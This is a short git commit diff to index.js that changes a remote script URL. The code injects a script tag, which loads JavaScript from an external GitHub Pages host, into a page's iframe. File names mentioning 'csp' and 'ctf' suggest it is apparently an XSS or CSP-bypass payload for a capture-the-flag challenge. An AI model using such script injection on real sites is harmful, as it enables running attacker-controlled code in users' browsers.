9cbb98a0ce72966be039129a957f3662c8792ba4
thisisashwani <ashwani.pandey@nutanix.com>
2022-10-16 14:41:00 +0530

    Update index.js

--- index.js
+++ index.js
@@ -1,3 +1,3 @@
 script=document.createElement(‘script’);
-script.src=’//thisisashwani.github.io/csp.js’;
+script.src=’//dr3dd589.github.io/ctf/main.css’;
 window.frames[0].document.head.appendChild(script);
